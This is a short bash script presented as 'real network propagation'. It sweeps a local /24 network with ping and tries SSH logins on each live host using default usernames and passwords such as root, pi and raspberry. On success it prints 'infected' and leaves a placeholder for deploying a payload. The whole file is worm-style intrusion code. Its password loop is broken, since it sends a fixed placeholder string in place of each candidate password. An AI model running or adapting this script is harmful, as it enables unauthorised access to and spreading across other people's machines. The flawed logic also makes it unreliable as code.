#!/bin/bash
# Real network propagation
echo "[*] Starting real network propagation..."

# Scan entire /24 network
for i in {1..254}; do
    ip="192.168.1.$i"
    if ping -c 1 -W 1 "$ip" >/dev/null 2>&1; then
        echo "[+] Target found: $ip"
        # Try SSH
        for user in root admin pi ubuntu; do
            for pass in password 1234 admin raspberry; do
                sshpass -p "SSH_PASSWORD_PLACEHOLDER" ssh -o StrictHostKeyChecking=no "$user@$ip" "echo infected" 2>/dev/null && {
                    echo "[+] Successfully accessed $ip as $user"
                    # Deploy payload here
                    break 2
                }
            done
        done
    fi
done
